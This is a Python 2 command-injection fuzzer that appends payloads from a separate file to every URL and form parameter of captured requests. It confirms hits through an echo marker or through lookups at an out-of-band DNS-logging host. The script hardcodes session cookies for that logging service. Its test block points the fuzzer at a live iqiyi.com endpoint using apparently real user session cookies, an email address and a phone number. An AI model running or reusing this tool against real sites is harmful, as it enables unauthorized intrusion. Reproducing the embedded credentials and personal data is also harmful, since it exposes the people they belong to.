#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time
import re
import Queue
import json
import os
import string
import random
import copy
import threading
import urlparse
import multiprocessing
from  multiprocessing import Process


class FuzzCIF:
    #running = True
    def __init__(self, taskQueue, resultQueue):
        self.taskQueue = taskQueue
        self.resultQueue = resultQueue
        a = os.path.split(os.path.realpath(__file__))[0]
        aj = os.path.join(a, "payload.json")
        with open(aj, "r") as f:
            payload = json.load(f)
        self.fuzzing_payloads_list = payload    # get payload from file
        # 需要添加dnslog的cookie。 dnslog.lijiejie.com
        self.dnsCookie = "csrftoken=hW9zsMitJfZoIZz24zkqcjLMyosnRJho; sessionid=zlgdjd5ar0q8vjeg1djj9cem9fp5rm8i"
        self.dnsApi = "http://dnslog.lijiejie.com/api/dns/devil/"
        self.webApi = "http://dnslog.lijiejie.com/api/web/devil/"
        self.dnsUrl = "devil.fachun.net"

        # dns log headers
        self.dnsHeaders = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
            "Cookie" : self.dnsCookie,
            "Connection" : "close",
            }
        #self.dnsSession = requests.Session()
        #self.dnsSession.headers.update(self.dnsHeaders)
        self.running = True

        # for now ,only use two payload, one is echo, another is ping, so, the is one key for echo
        self.echoKey = "Valar_Morghulis" # Maybe huluwa?

    def verifyDnsLog(self, item, TAG):
        # verify Normal Command:
        url = item["url"]
        #print "[+] [Fuzz Url] " + url
        headers = item["request_header"]
        aim = False
        try:
            if item["method"] == "GET":
                resp = requests.get(item["url"], headers=headers, timeout=(5, 15))
                if self.echoKey in resp.content and "echo" not in resp.content:
                    aim = True

            elif item["method"] == "POST":
                resp = requests.post(item["url"], data=item["request_content"], headers=headers, timeout=(5, 15))
                if self.echoKey in resp.content and "echo" not in resp.content:
                    aim = True
        except Exception as e:
            print "[-] [Error] [DnsVerify] [GET/POST] " + str(e)



        # verify DNS, if response is True, then return True, Else, return False
        if self.dnsUrl in item["url"] or self.dnsUrl in item["request_content"]:
            try:
                # sleep(1.5) to make the dnslog accept the log
                time.sleep(1)
                resp = requests.get(self.dnsApi + TAG, headers=self.dnsHeaders ,timeout=(5, 15))
                if "True" in resp.content:
                    aim = True
            except Exception as e:
                print "[-][ERROR] [DnsVerify] [DNS] " + str(e)

        return aim

    # define Get Process Method
    def Fuzzing_GET(self, item):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = item['url']
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

        url_parse = urlparse.urlparse(base_url)
        if url_parse.query == "":
            pass
        else:
            # get query dict
            query = dict(urlparse.parse_qsl(url_parse.query))
            #print query
            copy_query = copy.deepcopy(query)
            # first makeup payload, and this is add,
            for keys in query.keys():
                try:
                    for payload_item in fuzzing_payloads:
                        toreplace_payload = payload_item.encode("utf-8")
                        toreplace_payload = payload_item
                        if payload_item.find(self.dnsUrl) != -1:
                            payload_item = payload_item.replace(self.dnsUrl, TAG + "." + self.dnsUrl)
                            payload_item = query[keys] + payload_item
                        else:
                            payload_item = query[keys] + payload_item
                        
                        # makeup the all paramters
                        params = ""
                        for in_key in query.keys():
                            if in_key == keys:
                                params += in_key + "=" + payload_item
                            else:
                                params += in_key + "=" + query[in_key]
                            params += "&"
                        params = params[:-1]
                       
                        attack_url = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + params
                        c_item = copy.deepcopy(item) 
                        c_item["url"] = attack_url
                        isVuln_a = self.verifyDnsLog(c_item, TAG)
                        # if judge done, break
                        if isVuln_a:
                            _ = {"method": "GET", "url" : c_item["url"], "param" : params, "payload" : payload_item, "TAG": TAG}
                            self.resultQueue.put(_)
                            #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                            #return
                        """

                        # replace value to test
                        params = ""
                        if toreplace_payload.find(self.dnsUrl) != -1:
                            toreplace_payload = toreplace_payload.replace(self.dnsUrl, TAG + "." + self.dnsUrl)
                            #toreplace_payload = toreplace_payload
                        
                        for in_key in query.keys():
                            if in_key == keys:
                                params += in_key + "=" + toreplace_payload
                            else:
                                params += in_key + "=" + query[in_key]
                            params += "&"
                        
                        params = params[:-1]
                        attack_url = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + params 
                        c_item = copy.deepcopy(item)
                        c_item["url"] = attack_url
                        isVuln_r = self.verifyDnsLog(c_item, TAG)
                        # if judge done, break
                        if isVuln_r:
                            _ = {"method": "GET", "url" : c_item["url"], "param" : params, "payload" : toreplace_payload, "TAG": TAG}
                            self.resultQueue.put(_)
                            #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                            return
                       """
                except Exception as e:
                    print "[-] [Error] [Fuzz_GET] " + str(e)

        #return


    # Fuzzing_POST请求
    def Fuzzing_POST(self, item):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = item['url']
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

        post_body = item['request_content'] #
        if "{" in post_body and ":" in post_body and "}" in post_body:
            return
        query = dict(urlparse.parse_qsl(post_body))
        if not query:
            # pass json format data
            return 
        elif "multipart/form-data" in item["request_header"]["Content-Type"]:
            return
        else:
            for keys in query:
                try:
                    for payload_item in fuzzing_payloads:
                        # add to value
                        #toreplace_payload = payload_item
                        if self.dnsUrl in payload_item:
                            payload_item = payload_item.replace(self.dnsUrl, TAG + "." + self.dnsUrl)
                            payload_item = query[keys] + payload_item
                        else:
                            payload_item = query[keys] + payload_item
                        
                        params = ""
                        for in_key in query:
                            if in_key == keys:
                                params += in_key + "=" + payload_item
                            else:
                                params += in_key + "=" + query[in_key]
                            params += "&"
                        params = params[:-1]
                        try:
                            c_item = copy.deepcopy(item)
                            c_item["request_content"] = params
                            isVuln_a = self.verifyDnsLog(c_item, TAG)
                            if isVuln_a:
                                _ = {"mthod" : "POST", "url" : c_item["url"], "param" : params, "payload" : payload_item, "TAG": TAG}
                                self.resultQueue.put(_)
                            #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                            #return    
                        except Exception as e:
                            print "[-] [CIFuzz] [Fuzz_POST] " + repr(e)
                        """
                        params = ""

                        if toreplace_payload.find(self.dnsUrl) != -1:
                            toreplace_payload = toreplace_payload.replace(self.dnsUrl, TAG + "." + self.dnsUrl)
                        
                        for in_key in query:
                            if keys == in_key:
                                params += in_key + "=" + toreplace_payload
                            else:
                                params += in_key + "=" + query[in_key]
                            params += "&"
                        params = params[:-1]

                        c_item = copy.deepcopy(item)
                        c_item["request_content"] = params
                        isVuln_r = self.verifyDnsLog(c_item, TAG)
                        if isVuln_a:
                            _ = {"mthod" : "POST", "url" : c_item["url"], "param" : params, "payload" : toreplace_payload, "TAG": TAG}
                            self.resultQueue.put(_)
                            #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                            return    
                       """ 
                except Exception as e:
                    print "[-] [Error] [Fuzz_POST] " + str(e)


        """
        # work like shit...
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", post_body):
            try:
                print "[POST] Fuzzing "+match.group("parameter")
                for payload_item in fuzzing_payloads:
                    if self.dnsUrl in payload_item:
                        payload_item = payload_item.replace(self.dnsUrl, TAG+"."+self.dnsUrl)
                        payload_item = match.group("value")+payload_item
                    fuzzing_post_body = post_body.replace('%s=%s' % (match.group("parameter"), match.group("value")),'%s=%s' % (match.group("parameter"), payload_item))
                    item['request_content'] = fuzzing_post_body
                    isOver = self.verifyDnsLog(item, TAG)
                    if isOver:
                        _ = {"mthod" : "POST", "url" : item["url"], "param" : match.group("parameter"), "payload" : payload_item, "TAG": TAG}
                        self.resultQueue.put(_)
                        #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                        print "[+] Fuzzing Done!!"
                        return
                print "[failed] Fuzzing Done!!"
            except :
                pass
        """
        return

    #@staticmethod
    def terminate(self):
        self.running = False
        #print "self.running:\t {}".format(self.running)

    def task(self):
        while self.running:
            try:
                item = self.taskQueue.get(0.3)
                if item["method"] == "GET":
                    self.Fuzzing_GET(item)
                elif item["method"] == "POST":
                    self.Fuzzing_POST(item)
            except Exception as e:
                print "[-] [ERROR] [Fuzz Run] " + str(e)
        else:
            try:
                while not self.taskQueue.empty():
                    self.taskQueue.get_nowait()
            except Exception as e:
                print "[END]"


    def runFuzz(self):
        #print "SubProcess Pid: " + str(os.getpid())
        threads = []
        for i in range(15):
            thd = threading.Thread(target=self.task)
            thd.setDaemon(True)
            threads.append(thd)
        for thd in threads:
            thd.start()

        while True:
            try:
                for thd in threads:
                    #print "thd.name= " + thd.getName()
                    if thd.is_alive():
                        time.sleep(1)
            except KeyboardInterrupt as e:
                print "[-] [Error] [CIFuzz] [run] User KeyboardInterrupte"
                self.running = False
                break
            except Exception as e:
                print "[-] [Error] [CIFuzz] [run] Error Happend!!"
                break

        # while self.running:
        #     try:
        #         #print "self.running:\t" + str(self.running)
        #         item = self.taskQueue.get(0.3)
        #         if item["method"] == "GET":
        #             self.Fuzzing_GET(item)
        #         elif item["method"] == "POST":
        #             self.Fuzzing_POST(item)
        #     except Exception as e:
        #         print "[-] [ERROR] [Fuzz Run] " + str(e)


if __name__ == '__main__':
    """
    with open("payload.json", "r") as f:
        lines = json.load(f)
    print len(lines)
    for i in lines:
        print i

    """
    item = {
        "method" : "GET",
        "url" : "http://api.t.iqiyi.com/feed/get_feed?uid=1409979958&authcookie=44zpCeNFgez79OVwz7GjJWVUaTN2m1bHxsQNLm306MVZm2m3ruh4Qm2w4SYwqDT9sDTos148d&device_id=mqaguvg2qatzipbhxzd2sbcxadxumaaz&agenttype=121&agentversion=6.0.46.4598&wallId=false&feedId=30267718948&version=1&praise=0&callback=jQuery17206312791961245239_1502178651908&_=1502178652025",
        "request_header" : {"Accept-Language": "en-US,en;q=0.8", "Accept-Encoding": "identity", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Falcon/5.0.7.1", "Host": "api.t.iqiyi.com", "Referer": "http://paopaoquan.iqiyi.com/feed", "Cookie": "P00004=-898887952.1501743222.891ba158bb; QC008=1498535221.1501744345.1501744345.3; QC005=437b5f59bacf7103319dfd55207aba05; P00001=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00003=1408465522; P00010=1408465522; P01010=1501776000; P00007=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00PRU=1408465522; P00002=%7B%22uid%22%3A%221408465522%22%2C%22user_name%22%3A%2218510725391%22%2C%22email%22%3A%22xiaoyan_jia1%40163.com%22%2C%22nickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%2C%22pru%22%3A1408465522%2C%22type%22%3A11%2C%22pnickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%7D; P000email=xiaoyan_jia1%40163.com; QC160=%7B%22u%22%3A%2218510725391%22%2C%22lang%22%3Afalse%2C%22local%22%3A%7B%22name%22%3A%22%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%22%2C%22init%22%3A%22Z%22%2C%22rcode%22%3A48%2C%22acode%22%3A%2286%22%7D%2C%22type%22%3A%22p%22%7D; QC911=%2Ca%2C; QC006=dvp8siolnl5z9noyqsawy4ke; Hm_lvt_53b7374a63c37483e5dd97d78d9bb36e=1501744707; _ga=GA1.2.2099195777.1501754894; __dfp=a03f42a0ff28c54146a475515ac6107716ac525722f5524a60655b7c247897c14e@1504346712080@1501754712080; T00404=bcd404d21b7724fa0b932f06b949a6b4; pps_client_ver2=6.0.46.4598", "Proxy-Connection": "keep-alive"},
        "request_content" : ''
    }

    taskQueue = Queue.Queue()
    resultQueue = Queue.Queue()
    taskQueue.put(item)
    print "Main Process Pid: " + str(os.getpid())
    a = FuzzCIF(taskQueue, resultQueue)
    b = threading.Thread(target=a.runFuzz)
    b.daemon = True
    b.start()
    while True:
        try:
            print "[-------------------------]"
            time.sleep(10)
        except KeyboardInterrupt as e:
            a.terminate()
            break
    








